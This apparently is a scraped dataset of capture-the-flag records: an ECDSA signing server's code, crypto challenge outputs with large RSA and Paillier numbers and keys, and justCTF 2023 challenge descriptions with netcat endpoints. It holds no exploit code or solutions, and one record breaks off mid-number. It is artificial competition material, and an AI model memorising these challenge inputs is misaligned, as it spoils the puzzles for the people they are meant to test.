self.request.sendall(b\"\\nEnter message to sign (`!exit`) to return to main menu.\\n\\n>> \")\n            msg = self.request.recv(1024).strip().decode()\n            if msg == '!exit':\n                self.request.sendall(banner() + b\"\\n\")\n                break\n            try:\n                r, s = ecdsa_sign(KEY, msg)\n                response = f\"Signature (r, s): ({r}, {s})\\n \"\n                self.request.sendall(response.encode())\n            except Exception as e:\n                self.handle_error(str(e))\n\n\n    def handle_verification(self):\n        while True:\n            self.request.sendall(b\"Enter the message you want to verify in the format `message,r,s` (!exit to return to the main menu)\\n\\n>> \")\n            data = self.request.recv(1024).strip().decode()\n            if data == '!exit':\n                self.request.sendall(banner() + b\"\\n\\n>> \")\n                break\n            try:\n                message, r, s = data.split(',')\n                i_r, i_s = int(r), int(s)\n                valid = ecdsa_verify(Q, message, i_r, i_s)\n                result = b\"Signature is valid\" if valid else b\"Signature is invalid\"\n                self.request.sendall(result + b\"\\n\\n>> \")\n            except ValueError:\n                self.handle_error(\"Invalid input format for verification.\")\n\n\n    def send_flag(self):\n        flag = FLAG.encode()\n        iv = get_random_bytes(16)\n        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)\n        ct = cipher.encrypt(pad(flag, AES.block_size))\n        return (iv + ct).hex()\n", "tools": ["sage", "pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\backup\\challenge\\src\\server.py", "file_size": 6437, "scraped_at": "2025-10-26T18:20:14.405124"}
{"id": "l3ak-team_L3akCTF-2024-public_out", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "out", "attack_type": "Unknown", "writeup": "e = 65537\n\nciphertext = 179299686848994539141122382962230037744384497621603198124077003991636319769603564062817092353600906591207476251327282277695110268704615120068654776183507204512702766847930125900500659983050185274344899025779726523565280032908194763356944549824963215339419038543390439655210741510143003582737996617770895692162306286064421718892797213765237300926925675153074894532935937291295802157305724856321584517131226940140190491157709894421683196766707672593154406263054436900566231464719102312973247466510418770039194000878897515838985623461176782628261365771619698859295767451162504151010728056594695117040661023327968023451519804564\n\nc1 = 123377882241082251325350065419048806024607608617091688983830323277604694641240653374439302807138122463323990418348747537591347656262195555533468416119550902963546537686539626424151682647446653286178409257716563958279306978514921053134482777035689209563599648603507287706662378931300585730154813000147325737518201568052630101704051194396183990174893718130243703251255733422231215114594356086085529845721945162634747194330158630722370297888040809287372214916411109961066039419282486341414973486625115394106601990911459069075609672097833893961312251252396858703096951885954537748265354572684903035976149443662164781331591137509\n\nc2 = 216996462348882812127549126696128848915007479735759067925583940914005783704777739383583486500248026532990006813147882357469539758674416271697210195684094572116588619081813131930186778045755089586040232978039441432232050042271853194470413044599117641325812011411950889172242559099135026172425733801215110286748370156962444409678069139574351948837982999861835569715249682828276876910129256029485173183675521926552841364713489224945222100475996799601024631599522598983661501357640196487134275394097207489818217501235732511301942649024362999538093008833593968191799917057618382726046836320499881842515455356124359654138411130319\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\RSAn’t\\dist\\out.txt.txt", "file_size": 1911, "scraped_at": "2025-10-26T18:20:14.426659"}
{"id": "l3ak-team_L3akCTF-2024-public_out", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "out", "attack_type": "Unknown", "writeup": "n = 23446116820809956009508921267229329419806339208735431213584717790131416299556366048048977867380629435292555358502917305856047632651197352306945681062223443217527823509039445684919455982744684852068434951030105274549124012946448685060750456093120953320196777137936137902703756422225716380021864017594031233341531336018572970546112899850343992552126107820367629786159724290948728494321350895295087900001068499072242213916345639268473176748281877628559969801359815109260695490545357491404689132480248206287353580339535458835525161032145136894301169515951010316007454927062229765757932923091679510627796469997185047770119\na1 = 8104040836262507446864591234691358718164908580334110843106050982408624642389131164005601569999434432648709609777743793997208912520844943698036947408725027128235833538793471035056805185723079446135588491317378316082567779128276652380455054959975686544145446500257748715018799178783100289455255670805079936852471138049711583797615770901244436979110584710970079641409159097959783566594440737682826559724447739807028855072087914855150495360099989261682566388742966224528680792157619533719489447251411976029565538810357759752921276377948448704648350306514866111068184157760563297810978279434204440014428745729905509605285\nb1 = 1728445028759460100268916851157941317747744991464848324630394207912877842639961858831903114707815701742483947978256582554473425946268457939887471248397622887505458768276338958573804608581353987536415380192782284575648580559755923454408763552113403890642303139141765381991794536720006159278517578791058556250982111713910060167032647218698362613084823406687399478088149985930840603408274198692032083156828441656375986195794109996772306557258447129571560905620272546405603257541870547380051900022925294193741417962861863860715434297040138205460211370506997331099668562619882982110566078451957682401843673938997454325985\nct1 = 7133574145118001624468851232768367610776481589816189114081484875167835285211475440236501712634938993477027789627285581268361018888589847771555770716521123959004389671272089766710340921550798461319697963644164596608774387203602804547184454077314801365322929817266934087883757605888082111393091270686060676504784482770435773757625762542094784777964406426404482882414828990658303263295993951921074284755818657012216398826105099627761519486438690405668440835527144374828045319113524249938249744799530870449189528166252037249009094063960558703857141043081099174412277124506544776530125652348821688752923438304710034397792\na2 = 6932198124642373427967232343817468902255209063707505631753623131468591968939116907766874533903771236309508029958603993113318003707536772796355326212684792901937391081839814883783063784050698582961314998290360613480778658142959804536224436521802834308095784814005774038096434723020316915995654759582638114351622288228138452404715021874261743824588698845194567350953613460211780903933501965152586633117799392776012574047439430079820078546000748259648002297803211427390366076552057374120223207399161502626197672749700677144769182115211864885324511059266535644202147069163420794861424973102200053615106664642762054707456\nb2 = 17570492860498497589391311850810042101436988882059207563836745301643757694348737390349588510867234608796253222240056487274815481193573640552151307710984790365040907600873879523821340341063776797845384078798440533883164972773525749702026085462782235008812515983104980108840777316735468521572249232663287631112374534186975231033281807029801530398687397396929300293283833448151885674196708775598652356402354479252567714152805778278207736053329489014866155493921442482258381840272615320018058870234668488517354399053820878325928972260161611818894133121294554947400621261460441395783860055835185154356326202402937413717222\nct2 = 8778761624514690203726370366823530128900480928985439769115219364620387269991756967930541323829570453896164780238656562595733025340650482503284244625778872560261904887674968133049252085507078563540106328260114811619983171932648876602484063356832075687231100750407167402096299904835776594509894740386041222719008023556447633524625419665210188090816622517361786836014525679069179481575048514551967532281399777505866483289055530051032001545010914680661193107730444980281645735808124289602346876529763644878375393094200846185413267940739865639764057094273259729425291615810027734657664217752026488492540376475948687563210\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Related\\dist\\out.txt", "file_size": 4357, "scraped_at": "2025-10-26T18:20:14.447379"}
{"id": "l3ak-team_L3akCTF-2024-public_challenge", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "challenge", "attack_type": "AES", "writeup": "Ciphertext #1 = 0x14060da59e64dc74087b911f612d2c45d8253cb3d7cb322b3aea545b05460880b7c5cd99cdaad15d2bf7b92a5315c9cf6e1c962ebb1100e1b9d0b5f768419069cb4e53281c15d8a432f90ad33c6a3680c7a56df8680bf22765b4b5977bc30cdb49ea1dab83694268bf6869dcd587a8be2475330c339d441e8ce254559c3fe5e2b0296dd0239924e318d86b4c9f2babd2b49bf103fb6cc340e0bffe0dac3fda06aeb1e763f9d6713d62aee4aa9b7806b9dd1f311a528cd9531d997dfe31190f457af2576a79e4f873da57a28da763e07037dd6c7d14ef978bdcb857c7559ebe774c8db2ca34fc5841df1362ae768db89690216594c48ef23bd131618c3978a3bb36d420907947d862490376e20a9af43583960641b37a5733ee4082f8eb750d30eb8177e8af1d2589785b81d7e74c9ad386ef8280bc6c0d275bb95bb0cffd8b3e73db2e438880ff2f7bdd2bdfc0c8f3ee5265196d11eb9e4f5db8d643d5dc2d7c5372bad82d62cd2966ce033c5c609db288ef8484a664f4e33d19ce218ced0e7f46256c41d827813f4cb65425240762cc6e1c87421ff851c50f0c011e39655640bf3b8db0f43cb5ed93fb1967209d446d996c29abd76fa952fe31050b85d0e350dddc924421c3606d686e72d5764e0a596c95607ecb92a7cc7fe8c8b031e2877774f7df1e842107a4048306449ca7d66eb0cbfcd13b6b6cd3e2ae719b8e20530\nCiphertext #2 = 0x50258985886970e93e6b0105d26e42efe033a8216f721eaf981f89e9287b04ddfe5f16d3f6fcef6e814376c266e6738b29e47eb70b97fa9ff03e0e29e17d32d131550b94df94b7484f73592ecd15848594e9fc93e3401848b437bd6a8c67159c5410a32eebeab7285365ea69bfeeaaef975af1dd55c250bc30c709cdc631aa678f7e2795c6c5d66187974de4c6bfb30da14a9f9a91fcac9eccb463196d621ecdbeda28d682401c960a2dca58730766a6cecb83630ca92523b5bdd7c97019adc1754d0598d082cf51337e434bd2683d70ca074c276dc0e386a3a9a9ef189eff84a2acbdd7c1891c113589244d41d541dbc7a88639ab05b3c57cdd8fdfdbc7d3a9619bb8b0db85ce3e66640d2e1821da55ebdfb09e73230a08ad49d72707d4639763c8196568eb5654466743dd66c6cf37fafc97004aa0c063f54b145fb8d33dea6eb371af6e66d3e6fb3fa082712b5e4ad70580808fd650cc056aa17a88cc4ad0387701237f81a7039071aac653314a7dfe6fccd2b1e87cdf43832425a97ff9c5383133b6e984d9fb2132a80ee9b05cc7a2a493f9bc2197ba940826cdedd667a515d1554539eabc1ebdc9dd2075b80f98fa5e125a78891e64eb57f5e5eba97200d5c76f5d49646eda8671f5d289c1f8ca7c5033466b636052f10fbf0026c3c15f19b805271f9322a1c674cc33f69b725feb8a9087c05cc490c63fb467f499d9f\nModified Flag Cipher = 0x410f09e83a921ff2e06f9af688d56962be6b6db5472d84c802c89505bc80dcb06f09fba8cea712f3bd0af654b1e9c7010a20fe4bee9537c3e44771b90547103f9a313df10de3df68862c98ce7bfff47dc0547b65867b0990fd9ac496bf8e5df6c4fc8ad2ad074fb5083532dbb1f2373b9183770e2fda35498fa1753bb8ec4b1fcf80f100ae20eb8e865ef80e46435f75ec998af6cebb64717d76af38f926470207b8753bd94c0e55d7eaf7a5c352d718feead815aa886e585865c812f840da04fa24f411fc5917efcfc7549a41a22aed031842309709d93eb4818c62a00614f0ac13ac909454cb56780658d6188f813ba77ae52b76b2979423d9e62118a17114b8572a3219fda1e9399d91249fbb32b4e06615ce91de513f14231f42fe6b1e27027a22841554399b5c699a68dd308f0d11ed00580d703e9ea61710378b06bf3e55a4c6405e523184a3f4f9838c06ee650c7002b69106c8d7569c7f0628093fe61acbd2ce52654f6ebed132789daba9b26b989e3c6283326dec6c63df9ecfb60620cac002e680691d3cb8e4b4139596973a333eb5942f8512919e6b338631675c2c9ab58115aeaee009870a2a3d121c16574476211cdac81b78618f101315c694005ab7478546538e43559c3d29fb9508a1ca5a6e7afc046d0b450165f34ed611156ab9485adffd118013f8477ed8b7cf95f9008d0f140226644c99920af5633\nPublic Key = 0x250fb952a1b9ed84701fa2fe7b90615e4144635d26a566231e2eeefae591c74fdf8a775425cf26ee84b48460417ff1859f4279c703258b325e7196656293c9225db58a9b6054fa83a2e44fc00eb058dd3e1660fbdc79cfd427aa90b0e0efdc40e02753c715ea9e7de1f282554d99c22ba883ca433577f8eac31dcfa55117c933cb69c969d91065a5276eb07e81caaf4fb332cc0f40cf5c049b8e8c78288f7b7a7d71fc5e1dba03eab6359bca909157e8a422c03ec852ae8b6fd8eaf7a37b2e3b680448f42724a3431aa73df3debdc052791ee2d0d57499fa2f1a21cb10bfdd14c148545d59fb7c90b679d44d4ad298ea6e15f4782faf9c53b8c3cda7536f11a5, 0x250fb952a1b9ed84701fa2fe7b90615e4144635d26a566231e2eeefae591c74fdf8a775425cf26ee84b48460417ff1859f4279c703258b325e7196656293c9225db58a9b6054fa83a2e44fc00eb058dd3e1660fbdc79cfd427aa90b0e0efdc40e02753c715ea9e7de1f282554d99c22ba883ca433577f8eac31dcfa55117c933cb69c969d91065a5276eb07e81caaf4fb332cc0f40cf5c049b8e8c78288f7b7a7d71fc5e1dba03eab6359bca909157e8a422c03ec852ae8b6fd8eaf7a37b2e3b680448f42724a3431aa73df3debdc052791ee2d0d57499fa2f1a21cb10bfdd14c148545d59fb7c90b679d44d4ad298ea6e15f4782faf9c53b8c3cda7536f11a6\nPrivate Key = 0x250fb952a1b9ed84701fa2fe7b90615e4144635d26a566231e2eeefae591c74fdf8a775425cf26ee84b48460417ff1859f4279c703258b325e7196656293c9225db58a9b6054fa83a2e44fc00eb058dd3e1660fbdc79cfd427aa90b0e0efdc40e02753c715ea9e7de1f282554d99c22ba883ca433577f8eac31dcfa55117c933057d339c308438050366c6b40808a18b4448dfe495c06abe52abdaaeb86381c86a14ad5d91ff1b25aaf1e82d0e429c8622cd435389169a066357ef488c1725ec0812d3a8edd7bc93d5ac7344c074169dbfd52949913cb9779ce1f7aab96b9a8a554fb17493075a862ab37d30ea4fe91e5ee6f9b95e280b297e91357454800c60, 0x21c0ff97d130be489dd28344be8a9022b1ecbca51a8555c52e3512f65786623289f7effbda90d9e52e3066af88464b5157984983fdbd4a0a60eea984bb427230d6f4e0de54954ccc8efc58127b58fb02fed0ea47f4bd28072be2e02fa58abf65d15a644a55f847feca9e29596aa9fb6137d0bfa68c1a69e1f425f20063c8bf256b7aa3920b149169ca4cabbe2c3668d8edb", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\paillien-tourist\\dist\\challenge.txt", "file_size": 5222, "scraped_at": "2025-10-26T18:20:14.491443"}
{"id": "l3ak-team_L3akCTF-2024-public_output", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "output", "attack_type": "Unknown", "writeup": "C = [(34285747519707996626385667339662460790207453899564234933279840884637317470277963204844978855648863282661822817842406467276103235437115285776600339324582650206354227684286926765912841373720037206104315460984467834472878792871363724319500026730744559032592830317957861116684230815080884748210510265257121727411, 82389813574193236731268728055226346949935905889688170425892513962291738546070054175286986817742962125712704451033935523159914920684418980229184675189392660990212113237529057511102468180315624316711603102279872782413287481544411903032504611191117588506754985276936284421146109462510942343677179125102460355334, 127247078267314356402767966557448505733207679608121587776826570427528349536126399258128998506925096202352385266899982179247602157054605592001529350471426605916092686761690699179270970709575073044160148478140835495982904453410049961250136921488023338211130908836050232268149658252094451825981649386429967157023, 110997696050305177374684801376195205614043414698289134283464488914579055650336577562089998807469786126102628845652757901772021003891120075086100794690060492018372114798499796476503564426511552576093110306562634265833200794380828146503816203682087385703698944330589010185628240036153869595329794474678963954269, 95429943964904023259514531987953637596024020044100694025548029082876352647190904910373013883591092911247251504859346180249828148105405110896981416324094823746473360350150849817138654025822760100976625537661710179191573475427725481576122332324895773326199055069720422096583714906980119788052757109463536989130, 76925650644921944564121660415039326382672571942134701742579804900375156897677412516140878223663671839157682242947665571676520752706843330108967323669457404588586535061237444710279897627741144122937187393054928934936687732687921193790751566393662886825169077208127284176632544803227991370949818150005932210304), (0, 34285747519707996626385667339662460790207453899564234933279840884637317470277963204844978855648863282661822817842406467276103235437115285776600339324582650206354227684286926765912841373720037206104315460984467834472878792871363724319500026730744559032592830317957861116684230815080884748210510265257121727411, 85967636444726554256032386847538080607273641997139556709873191645024773479482183751659433639594934875197169824518560503372716992088412826701271790577397701838066670897181757432783438839115526851698428389903365201752735197054876789440370911041505435306549154757322168278884403206082946661059841799276902279607, 110321848943899292929831522195898953167052692821484311182642200713072229078674653831094653900345561159369211814825383018259327689455180388330932020089176571654576145870074563603252413779245365342554600824303390696086590372070050354595330074227342114164575397697848706436203854215556384244963529017935602600689, 55321436108075224950728586469455754360500596962017688262306497027259209074949803121055336152763619653715618911652213266949708309957674991371935559144633368828172207173145372615220450607178667764319048810554905786212377479905241378131059006116348325599909367174854478256625377537634718283487921887388679931300, 121048214328487578063535470984430739166205977393814304445813791572773220134359940700786671669567539273399625221907347167959074671295760177948556479010579225978917918535032412717072730223986401267581116138177971941402742413385270319230751393845616816965070450211819298226894334399356881715479006792296977303116), (0, 0, 80891788386112939497749276978496951092908047537517752191112348346041605282820278415204830919700840360371114407873821260986140627885494462923855784343766007471406691139724032186081486065167152331309928933439563087594932165713814698240940689654799590764311096627705559355661741126880749623083953480524440103996, 98127807327139994371479310755482264253499077621954160265776803909962087269443207623777017430975688540885576031084499718360878131623357206459366594111595569751254398053416214104147757969318816248746123610412479211529236153906708864168414330919431944363564172025204269508207805032491500543298879609362168155698, 65511482182385099252523608525317643713139065614405324455763784441479732896196144143630212812577305057210145612770975280343168022555945650814573970996890826522557999047275529322348420693034478105886809355222570889445527587635177667364042090723912339748512431185136779345494523747668733698804934976215893958288, 47395420931311533463576620820998773093140094423967370338777509171164699213419123512474441784558146041667540557107610725716163070022770572094504815720978368593469076026134774205916872923158523446883115622548066715665889163816586554653727221255672945695748970848307935789400330008330191289067490505817853508862), (0, 0, 0, 80891788386112939497749276978496951092908047537517752191112348346041605282820278415204830919700840360371114407873821260986140627885494462923855784343766007471406691139724032186081486065167152331309928933439563087594932165713814698240940689654799590764311096627705559355661741126880749623083953480524440103996, 196988", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Matrix-Magic\\dist\\output.txt", "file_size": 6576, "scraped_at": "2025-10-26T18:20:14.510420"}
{"id": "justcatthefish_justctf-2023_Easy_Auth", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Easy Auth", "attack_type": "Unknown", "writeup": "### Easy Auth\nThey said that it's easy to implement authentication and authorization using cloud services. Is it? ( ͡° ͜ʖ ͡°)\n\n* https://easyauth.web.jctf.pro/login\n\n*Remember that DDoS'ing AWS is illegal, plx do not do this, thx m8\n\n\nAttachments:\n* [pow_solver.py](./public/pow_solver.py)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\cloud_easyauth\\README.md", "file_size": 289, "scraped_at": "2025-10-26T18:20:50.604820"}
{"id": "justcatthefish_justctf-2023_Multi_Auth", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Multi Auth", "attack_type": "Unknown", "writeup": "### Multi Auth\nEvery crypto code may have bugs, so we have made a multi-authentication system diversifying across algorithms and languages.\n\n```\nnc multiauth.nc.jctf.pro 1337\n```\nAuthor: gros\n\n\nAttachments:\n* [multiauth.zip](./public/multiauth.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\crypto_multi_auth\\README.md", "file_size": 248, "scraped_at": "2025-10-26T18:20:50.626416"}
{"id": "justcatthefish_justctf-2023_Vaulted", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Vaulted", "attack_type": "Unknown", "writeup": "### Vaulted\nThis secure multisignature application will keep our flag safe. Mind holding on to one of the backup keys?\n\n```\nnc vaulted.nc.jctf.pro 1337\n```\n\n\nAuthor: Tjaden Hess from Trail of Bits\n\n\nAttachments:\n* [docker.tar.gz](./public/vaulted_docker.tar.gz)\n* [vaulted.py](./public/vaulted.py)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\crypto_vaulted\\README.md", "file_size": 297, "scraped_at": "2025-10-26T18:20:50.638756"}
{"id": "justcatthefish_justctf-2023_ECC_for_Dummies", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "ECC for Dummies", "attack_type": "Unknown", "writeup": "### ECC for Dummies\nSometimes you have to force logic to do what you want it to do\n\n```\nnc eccfordummies.nc.jctf.pro 1337\n```\n\n\nAttachments:\n* [ecc_for_dummies.zip](./public/ecc_for_dummies.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\misc_ecc_for_dummies\\README.md", "file_size": 194, "scraped_at": "2025-10-26T18:20:50.655453"}
{"id": "justcatthefish_justctf-2023_ECC_not_only_for_Dummies", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "ECC not only for Dummies", "attack_type": "Unknown", "writeup": "### ECC not only for Dummies\nThis to you will need to use all logic that you have\n\n```\nnc eccnotonlyfordummies.nc.jctf.pro 1337\n```\nPoW:\n[PoW on Github](https://github.com/balsn/proof-of-work)\n\n\nAttachments:\n* [ecc_not_only_for_dummies.zip](./public/ecc_not_only_for_dummies.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\misc_ecc_not_only_for_dummies\\README.md", "file_size": 279, "scraped_at": "2025-10-26T18:20:50.670108"}
{"id": "justcatthefish_justctf-2023_Formula_L", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Formula L", "attack_type": "Misc", "writeup": "### Formula L\nWe didn't get to see a Grand Prix in Italy this year, but fortunately we got our hands on a telemetry file from another race. Can you find the flag?\n\n```\nUse nc formula.nc.jctf.pro 1337 to test the encoding\n```\n\n\nAuthor: @artcz\n\n\nAttachments:\n* [data.txt](./public/data.txt)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\misc_formula_l\\README.md", "file_size": 288, "scraped_at": "2025-10-26T18:20:50.688587"}
{"id": "justcatthefish_justctf-2023_PyPlugins", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "PyPlugins", "attack_type": "Unknown", "writeup": "### PyPlugins\n_Digital dreams crossing over the sea,_\n_Welcome to a world where hackers decree._ \n_They may load a plugin from a fancy domain,_\n_Such that it would exploit this known terrain._\n \n_With strings of code, they wield their might,_\n_Exploiting vulnerabilities, shining in the night._\n_Through crafted scripts, they seek to obtain,_\n_Domain takeovers, a hacker's domain._\n\n```\nnc pyplugins.nc.jctf.pro 1337\n```\n\nCreated by: Disconnect3d from Trail of Bits\n\n\n\nAttachments:\n* [pyplugins.zip](./public/pyplugins.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\misc_pyplugins\\README.md", "file_size": 523, "scraped_at": "2025-10-26T18:20:50.702942"}
{"id": "justcatthefish_justctf-2023_Safeblog", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Safeblog", "attack_type": "Unknown", "writeup": "### Safeblog\nI am excited to announce that I have finally created my very own personal blog! However, I must confess that I was feeling a little lazy, so instead of building everything from scratch, I decided to use some existing blogs from past CTF challenges (hugeblog and miniblog#). Some patching was done to their security vulnerabilities to ensure that my blog is completely secure.\n\n*Note: It is recommended to run local server, after you read the dummy flag try the __same__ solution on remote.*\n\n* [http://safeblog.web.jctf.pro](http://safeblog.web.jctf.pro)\n\n\n\nAttachments:\n* [challenge.7z](./public/challenge.7z)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\misc_safeblog\\README.md", "file_size": 623, "scraped_at": "2025-10-26T18:20:50.718723"}
{"id": "justcatthefish_justctf-2023_Secure_DB", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Secure DB", "attack_type": "Unknown", "writeup": "### Secure DB\nCan your run some simple queries for me?\n\n```\nnc securedb.nc.jctf.pro 1337\n```\n\n\nAttachments:\n* [secure_db.zip](./public/secure_db.zip)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\misc_secure_db\\README.md", "file_size": 150, "scraped_at": "2025-10-26T18:20:50.735599"}
{"id": "justcatthefish_justctf-2023_Baby_Otter", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Baby Otter", "attack_type": "Unknown", "writeup": "### Baby Otter\nWhile countless CTF players revel in the companionship of 'just cats' or 'just fish', a truly distinguished cadre of enthusiasts takes pride in their extraordinary bond with otters. To join this exclusive league of otter aficionados you must embark upon a quest to unveil the well-guarded secret code that unlocks the gateway to otter ownership.\n\n```\nnc babyotter.nc.jctf.pro 1337\n```\n\nAuthor: FeDEX from OtterSec\n\n\nAttachments:\n* [baby_otter.zip](./public/baby_otter.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_baby_otter\\README.md", "file_size": 487, "scraped_at": "2025-10-26T18:20:50.747322"}
{"id": "justcatthefish_justctf-2023_Mystery_locker", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Mystery locker", "attack_type": "Unknown", "writeup": "### Mystery locker\nIn the chaotic locker room, a mysterious heap of items awaits your wit and determination to uncover its secrets, but be prepared for mischievous surprises at every turn.\n\n```\nnc mysterylocker.nc.jctf.pro 1337\n```\n\n\nAuthor: Rivit\n\n\nAttachments:\n* [mystery_locker.zip](./public/mystery_locker.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_mystery_locker\\README.md", "file_size": 314, "scraped_at": "2025-10-26T18:20:50.759829"}
{"id": "justcatthefish_justctf-2023_notabug", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "notabug", "attack_type": "Unknown", "writeup": "### notabug\nLet it roll. It's a feature, not a bug!\n\n```\nnc notabug.nc.jctf.pro 1337\n```\n\nAuthors: adamm, haqpl\n\n\nAttachments:\n* [notabug.zip](./public/notabug.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_notabug\\README.md", "file_size": 164, "scraped_at": "2025-10-26T18:20:50.772749"}
{"id": "justcatthefish_justctf-2023_notabug2", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "notabug2", "attack_type": "Unknown", "writeup": "### notabug2\nLet it roll ( :) this time intended way). It's a feature, not a bug!\n\n```\nnc notabug2.nc.jctf.pro 1337\n```\n\nAuthors: adamm, haqpl\n\n\nAttachments:\n* [notabug.zip](./public/notabug.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_notabug2\\README.md", "file_size": 195, "scraped_at": "2025-10-26T18:20:50.792128"}
{"id": "justcatthefish_justctf-2023_nucleus", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "nucleus", "attack_type": "Unknown", "writeup": "### nucleus\n```\nnc nucleus.nc.jctf.pro 1337\n```\n\nAuthor: adamm\n\n\nAttachments:\n* [nucleus](./public/nucleus)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_nucleus\\README.md", "file_size": 107, "scraped_at": "2025-10-26T18:20:50.809420"}
{"id": "justcatthefish_justctf-2023_Tic_Tac_PWN!", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Tic Tac PWN!", "attack_type": "Pwn", "writeup": "### Tic Tac PWN!\nLet's pretend I just learned about this cool thing called RPC and wrote a simple example! Is it secure?\n```\nnc tictac.nc.jctf.pro 1337\n```\n\nNote: do not focus on run.sh, nsjail.cfg or the Dockerfile: those are there to host and jail/sandbox the challenge properly.\nNote2: If you get a `Couldn't initialize cgroup 2 user namespace for pid=...` in container logs, you lack cgroups v2 - you can mitigate this by commenting out `use_cgroupv2`, `group_pids_max`, `cgroup_mem_max`, `cgroup_cpu_ms_per_sec` lines in `nsjail.cfg`.\n\nAuthor: ptrtofuture\n\n\nAttachments:\n* [pwn-tic-tac.zip](./public/pwn-tic-tac.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_tic_tac_pwn\\README.md", "file_size": 621, "scraped_at": "2025-10-26T18:20:50.828663"}
{"id": "justcatthefish_justctf-2023_Welcome_in_my_house", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Welcome in my house", "attack_type": "Pwn", "writeup": "### Welcome in my house\nMay the Force be with you.\n\n```\nnc house.nc.jctf.pro 1337\n```\n\nNote: do not focus on run.sh, nsjail.cfg or the Dockerfile: those are there to host and jail/sandbox the challenge properly.\nNote2: If you get a `Couldn't initialize cgroup 2 user namespace for pid=...` in container logs, you lack cgroups v2 - you can mitigate this by commenting out `use_cgroupv2`, `group_pids_max`, `cgroup_mem_max`, `cgroup_cpu_ms_per_sec` lines in `nsjail.cfg`.\n\nAuthor: sploitpid1\n\n\nAttachments:\n* [house.zip](./public/house.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_welcome_in_my_house\\README.md", "file_size": 538, "scraped_at": "2025-10-26T18:20:50.845587"}
{"id": "justcatthefish_justctf-2023_Windytooth", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Windytooth", "attack_type": "Unknown", "writeup": "### Windytooth\nI reported a 0day in Zephyr more than a month ago along with a patch but they still didn't bother to fix it, so here we are.\n\n```\nnc windytooth.nc.jctf.pro 1337\n```\n\nAuthor: Arusekk\n\n\nAttachments:\n* [windytooth.zip](./public/windytooth.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\pwn_windytooth\\README.md", "file_size": 255, "scraped_at": "2025-10-26T18:20:50.860443"}
{"id": "justcatthefish_justctf-2023_manGO", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "manGO", "attack_type": "Unknown", "writeup": "### manGO\nI like perfectly rounded mangos, how about you?\n\n\nAttachments:\n* [mango.zip](./public/mango.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\re_mango\\README.md", "file_size": 106, "scraped_at": "2025-10-26T18:20:50.876040"}
{"id": "justcatthefish_justctf-2023_nvm", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "nvm", "attack_type": "Unknown", "writeup": "### nvm\nSome time ago I hosted a service that allowed me to do calculations on my computer. One day I noticed someone was executing the same code over and over again. After analyzing the network traffic, I noticed that only the initial packets change.\n\nCan you find out what's going on?\n\nAuthor: Rivit\n\n\nAttachments:\n* [nvm.zip](./public/nvm.zip)", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\re_nvm\\README.md", "file_size": 346, "scraped_at": "2025-10-26T18:20:50.893011"}
